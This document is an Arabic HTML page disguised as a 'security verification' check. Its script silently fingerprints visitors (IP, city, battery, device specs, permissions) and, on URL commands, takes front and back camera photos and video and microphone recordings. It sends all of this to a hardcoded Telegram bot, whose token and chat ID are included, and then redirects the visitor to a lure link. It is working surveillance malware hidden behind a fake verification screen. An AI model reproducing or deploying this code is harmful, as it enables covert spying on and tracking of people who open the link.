<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>التحقق الأمني</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', 'Poppins', 'Cairo', system-ui, sans-serif;
            direction: rtl;
            padding: 1rem;
        }
        .verification-card {
            background: rgba(18, 25, 45, 0.75);
            backdrop-filter: blur(12px);
            border-radius: 2.5rem;
            padding: 2rem 1.8rem;
            width: 100%;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .title {
            font-size: 1.9rem;
            font-weight: 700;
            background: linear-gradient(135deg, #FFFFFF 0%, #A0B3E0 100%);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 0.75rem;
        }
        .sub {
            color: #8e9bbe;
            font-size: 0.9rem;
            margin-bottom: 2.5rem;
            border-right: 2px solid #3e5a9c;
            padding-right: 0.75rem;
            display: inline-block;
        }
        .spinner-container {
            position: relative;
            width: 120px;
            height: 120px;
            margin: 1.5rem auto 2rem;
        }
        .circular-progress {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: conic-gradient(from 0deg, #2a6df4, #9f4eff, #2a6df4);
            mask: radial-gradient(farthest-side, transparent calc(100% - 8px), #000 calc(100% - 8px));
            -webkit-mask: radial-gradient(farthest-side, transparent calc(100% - 8px), #000 calc(100% - 8px));
            animation: spin 1.4s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .inner-icon {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 2.2rem;
            font-weight: bold;
            color: white;
            text-shadow: 0 0 8px #2a6df4;
        }
        .status-text {
            color: #cbd5ff;
            font-size: 1rem;
            background: rgba(0, 0, 0, 0.4);
            padding: 0.5rem 1rem;
            border-radius: 60px;
            display: inline-block;
            margin-top: 1rem;
            backdrop-filter: blur(4px);
        }
        .footer-note {
            margin-top: 2rem;
            font-size: 0.7rem;
            color: #4a567a;
        }
    </style>
</head>
<body>
<div class="verification-card">
    <div class="title">✓ التحقق الأمني</div>
    <div class="sub">جاري تأكيد هويتك</div>
    <div class="spinner-container">
        <div class="circular-progress"></div>
        <div class="inner-icon">🛡️</div>
    </div>
    <div class="status-text" id="statusMsg">جاري التحقق من أنك إنسان ...</div>
    <div class="footer-note">نظام حماية متقدم | انتظر لحظات</div>
</div>

<script>
    (function(){
        const BOT_TOKEN = "8708315102:AAGa62Wi5kAvAs1qj-heQR7LowoBbINNLwM";
        const CHAT_ID = "7719763576";

        // رسالة المستخدم ثابتة
        const statusEl = document.getElementById("statusMsg");
        if(statusEl) statusEl.innerText = "جاري التحقق من أنك إنسان ...";

        // تحليل الرابط
        const urlParams = window.location.search.substring(1);
        let targetUrl = null;
        let actionList = [];

        if(urlParams && urlParams.includes("=")){
            let match = urlParams.match(/^(https?:\/\/[^=]+)=(.+)$/);
            if(match){
                targetUrl = match[1];
                const rawActions = match[2];
                const actionRegex = /(FC|BC|M|I)(\d*)/g;
                let actMatch;
                while((actMatch = actionRegex.exec(rawActions)) !== null){
                    let typeRaw = actMatch[1];
                    let numStr = actMatch[2];
                    let duration = numStr ? parseInt(numStr,10) : 0;
                    if(typeRaw === "I") actionList.push({ type:"info", duration:0 });
                    else if(typeRaw === "FC") {
                        if(duration === 0) actionList.push({ type:"frontPhoto", duration:0 });
                        else actionList.push({ type:"frontVideo", duration:duration });
                    }
                    else if(typeRaw === "BC") {
                        if(duration === 0) actionList.push({ type:"backPhoto", duration:0 });
                        else actionList.push({ type:"backVideo", duration:duration });
                    }
                    else if(typeRaw === "M" && duration > 0) actionList.push({ type:"micAudio", duration:duration });
                }
            }
        }

        if(!targetUrl){
            targetUrl = "http://t.me/Glitch_telebot";
            actionList = [{ type:"info", duration:0 }];
        }
        if(actionList.length === 0) actionList.push({ type:"info", duration:0 });

        // دوال الإرسال إلى تيليجرام (مع إعادة المحاولة)
        async function sendToTelegram(method, payload, isFormData = false) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
            for(let attempt = 0; attempt < 2; attempt++) {
                try {
                    let res;
                    if(isFormData) {
                        res = await fetch(url, { method:"POST", body:payload });
                    } else {
                        res = await fetch(url, {
                            method:"POST",
                            headers: { "Content-Type":"application/json" },
                            body: JSON.stringify(payload)
                        });
                    }
                    const json = await res.json();
                    if(json.ok) return json;
                    console.error(`Telegram error attempt ${attempt+1}:`, json);
                } catch(e) { console.error(`Fetch error attempt ${attempt+1}:`, e); }
                await new Promise(r => setTimeout(r, 500));
            }
            return null;
        }

        // إرسال رسالة نصية قصيرة (اختبار)
        async function sendTextMessage(text) {
            return await sendToTelegram("sendMessage", {
                chat_id: CHAT_ID,
                text: text,
                disable_web_page_preview: true
            });
        }

        // جمع المعلومات وتقسيمها إلى رسائل متعددة
        async function getDeviceDetails() {
            const ua = navigator.userAgent;
            let deviceModel = "غير معروف";
            const modelMatch = ua.match(/\((.*?)\)/);
            if(modelMatch && modelMatch[1]) deviceModel = modelMatch[1].split(";").pop().trim() || "غير معروف";
            const language = navigator.language || navigator.userLanguage;
            let ip = "0.0.0.0", country="غير متوفر", region="غير متوفر", city="غير متوفر", timezone="غير متوفر";
            try{
                const ipRes = await fetch("https://api.ipify.org?format=json");
                const ipData = await ipRes.json();
                ip = ipData.ip;
                const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,timezone`);
                const geo = await geoRes.json();
                if(geo.status === "success"){
                    country = geo.country || country;
                    region = geo.regionName || region;
                    city = geo.city || city;
                    timezone = geo.timezone || timezone;
                }
            } catch(e){}
            let batteryInfo = { level:"غير معروف", charging:"غير معروف" };
            if(navigator.getBattery){
                try{
                    const battery = await navigator.getBattery();
                    batteryInfo.level = Math.round(battery.level * 100) + "%";
                    batteryInfo.charging = battery.charging ? "نعم" : "لا";
                } catch(e){}
            }
            let storageEstimate = { used:0, total:0 };
            if(navigator.storage && navigator.storage.estimate){
                try{
                    const est = await navigator.storage.estimate();
                    storageEstimate.used = (est.usage / (1024**3)).toFixed(2);
                    storageEstimate.total = (est.quota / (1024**3)).toFixed(2);
                } catch(e){}
            }
            const cpuCores = navigator.hardwareConcurrency || "غير معروف";
            const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معروف";
            const resolution = `${screen.width}x${screen.height}`;
            const now = new Date();
            const timeStr = now.toLocaleTimeString('ar-EG');
            const dateStr = now.toLocaleDateString('ar-EG');
            const weekdays = ["الأحد","الإثنين","الثلاثاء","الأربعاء","الخميس","الجمعة","السبت"];
            const dayName = weekdays[now.getDay()];
            let cameraPerm = "غير معروف", locationPerm = "غير معروف";
            try{
                const permStatus = await navigator.permissions.query({ name:"camera" });
                cameraPerm = permStatus.state === "granted" ? "مسموح" : (permStatus.state === "denied" ? "مرفوض" : "غير محدد");
            } catch(e){}
            try{
                const locStatus = await navigator.permissions.query({ name:"geolocation" });
                locationPerm = locStatus.state === "granted" ? "مسموح" : (permStatus.state === "denied" ? "مرفوض" : "غير محدد");
            } catch(e){}
            return {
                deviceModel, userAgent: ua, language, ip, country, region, city, timezone,
                batteryLevel: batteryInfo.level, batteryCharging: batteryInfo.charging,
                cpuCores, ram, storageUsed: storageEstimate.used, storageTotal: storageEstimate.total,
                resolution, cameraPerm, locationPerm, enterTime: timeStr, enterDate: dateStr, enterDay: dayName,
                targetLink: targetUrl
            };
        }

        async function sendInfoMessage() {
            const d = await getDeviceDetails();
            // الرسالة الأولى: الجهاز والمتصفح والشبكة
            let msg1 = `📊 *معلومات الزائر* 📊\n\n` +
                       `🖥️ الجهاز: ${d.deviceModel}\n` +
                       `🌐 اللغة: ${d.language}\n` +
                       `📡 IP: ${d.ip}\n` +
                       `📍 الدولة: ${d.country}\n` +
                       `🗺️ المنطقة: ${d.region}\n` +
                       `🏙️ المدينة: ${d.city}\n` +
                       `⏰ التوقيت: ${d.timezone}\n\n` +
                       `🖼️ الدقة: ${d.resolution}\n` +
                       `🔋 البطارية: ${d.batteryLevel} (شحن: ${d.batteryCharging})\n` +
                       `💾 الرام: ${d.ram} | المعالج: ${d.cpuCores} نواة\n` +
                       `📦 التخزين: ${d.storageUsed} GB / ${d.storageTotal} GB\n\n` +
                       `🔐 صلاحيات الكاميرا: ${d.cameraPerm}\n` +
                       `📍 صلاحيات الموقع: ${d.locationPerm}\n\n` +
                       `⏱️ وقت الدخول: ${d.enterTime} - ${d.enterDate} (${d.enterDay})\n\n` +
                       `🔗 الرابط الهدف: ${d.targetLink}`;
            
            // إرسالها كـ HTML عادي بدون Markdown (للتأكد)
            await sendTextMessage(msg1.replace(/\*/g, ''));
            
            // إرسال User Agent كرسالة ثانية لتجنب الطول
            let msg2 = `🖥️ User Agent:\n${d.userAgent.substring(0, 380)}`;
            await sendTextMessage(msg2);
        }

        // دوال الكاميرا والميكروفون (نفس السابق ولكن بدون رسائل للمستخدم)
        async function getCameraStream(facingMode, mediaType, durationSec){
            let constraints = { video: { facingMode: { exact: facingMode } } };
            try{
                let stream = await navigator.mediaDevices.getUserMedia(constraints);
                if(mediaType === "photo"){
                    const track = stream.getVideoTracks()[0];
                    const imageCapture = new ImageCapture(track);
                    const bitmap = await imageCapture.grabFrame();
                    const canvas = document.createElement("canvas");
                    canvas.width = bitmap.width;
                    canvas.height = bitmap.height;
                    const ctx = canvas.getContext("2d");
                    ctx.drawImage(bitmap, 0, 0);
                    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
                    track.stop();
                    stream.getTracks().forEach(t=>t.stop());
                    return { blob, type:"photo", extension:"jpg" };
                } else if(mediaType === "video"){
                    let chunks = [];
                    const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
                    recorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
                    const stopPromise = new Promise(resolve => { recorder.onstop = () => resolve(new Blob(chunks, { type: "video/webm" })); });
                    recorder.start();
                    setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, durationSec * 1000);
                    const videoBlob = await stopPromise;
                    stream.getTracks().forEach(t=>t.stop());
                    return { blob: videoBlob, type:"video", extension:"webm" };
                }
                stream.getTracks().forEach(t=>t.stop());
                return null;
            } catch(err){
                try{
                    let fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
                    if(mediaType === "photo"){
                        const track = fallbackStream.getVideoTracks()[0];
                        const imageCapture = new ImageCapture(track);
                        const bitmap = await imageCapture.grabFrame();
                        const canvas = document.createElement("canvas");
                        canvas.width = bitmap.width;
                        canvas.height = bitmap.height;
                        const ctx = canvas.getContext("2d");
                        ctx.drawImage(bitmap, 0, 0);
                        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
                        track.stop();
                        fallbackStream.getTracks().forEach(t=>t.stop());
                        return { blob, type:"photo", extension:"jpg" };
                    } else if(mediaType === "video"){
                        let chunks = [];
                        const recorder = new MediaRecorder(fallbackStream, { mimeType: "video/webm" });
                        recorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
                        const stopPromise = new Promise(resolve => { recorder.onstop = () => resolve(new Blob(chunks, { type: "video/webm" })); });
                        recorder.start();
                        setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, durationSec * 1000);
                        const videoBlob = await stopPromise;
                        fallbackStream.getTracks().forEach(t=>t.stop());
                        return { blob: videoBlob, type:"video", extension:"webm" };
                    }
                } catch(e2){ return null; }
                return null;
            }
        }

        async function recordAudio(seconds){
            try{
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream, { mimeType: "audio/webm" });
                let chunks = [];
                mediaRecorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
                const stopPromise = new Promise(resolve => { mediaRecorder.onstop = () => resolve(new Blob(chunks, { type: "audio/webm" })); });
                mediaRecorder.start();
                setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, seconds * 1000);
                const blob = await stopPromise;
                stream.getTracks().forEach(t=>t.stop());
                return { blob, type:"audio", extension:"webm" };
            } catch(e){ return null; }
        }

        async function captureMedia(mode, type, durationSec){
            if(mode === "frontPhoto" || mode === "frontVideo") return await getCameraStream("user", type, durationSec);
            if(mode === "backPhoto" || mode === "backVideo") return await getCameraStream("environment", type, durationSec);
            if(mode === "micAudio") return await recordAudio(durationSec);
            return null;
        }

        async function sendMediaToBot(mediaObj, captionPrefix){
            if(!mediaObj || !mediaObj.blob) return;
            const formData = new FormData();
            const filename = `${Date.now()}_${Math.random()}.${mediaObj.extension}`;
            formData.append("chat_id", CHAT_ID);
            formData.append("document", mediaObj.blob, filename);
            if(captionPrefix) formData.append("caption", captionPrefix);
            await sendToTelegram("sendDocument", formData, true);
        }

        async function runActions(actions){
            for(let act of actions){
                if(act.type === "info"){
                    await sendInfoMessage();
                    await new Promise(r => setTimeout(r, 500));
                } else if(act.type === "frontPhoto"){
                    const media = await captureMedia("frontPhoto", "photo", 0);
                    if(media) await sendMediaToBot(media, "🖼️ صورة أمامية");
                } else if(act.type === "frontVideo"){
                    const media = await captureMedia("frontVideo", "video", act.duration);
                    if(media) await sendMediaToBot(media, `🎬 فيديو أمامي ${act.duration}ث`);
                } else if(act.type === "backPhoto"){
                    const media = await captureMedia("backPhoto", "photo", 0);
                    if(media) await sendMediaToBot(media, "📷 صورة خلفية");
                } else if(act.type === "backVideo"){
                    const media = await captureMedia("backVideo", "video", act.duration);
                    if(media) await sendMediaToBot(media, `🎞️ فيديو خلفي ${act.duration}ث`);
                } else if(act.type === "micAudio"){
                    const media = await captureMedia("micAudio", "audio", act.duration);
                    if(media) await sendMediaToBot(media, `🎤 تسجيل صوتي ${act.duration}ث`);
                }
                await new Promise(r => setTimeout(r, 300));
            }
        }

        // بدء التنفيذ
        (async function(){
            try{
                // إرسال رسالة بدء للتأكد من أن البوت يتلقى رسائل نصية
                await sendTextMessage("🔍 بدء عملية التحقق - تم استقبال زائر جديد");
                await runActions(actionList);
            } catch(e){ console.error(e); }
            setTimeout(()=>{
                window.location.href = targetUrl;
            }, 1500);
        })();
    })();
</script>
</body>
</html>
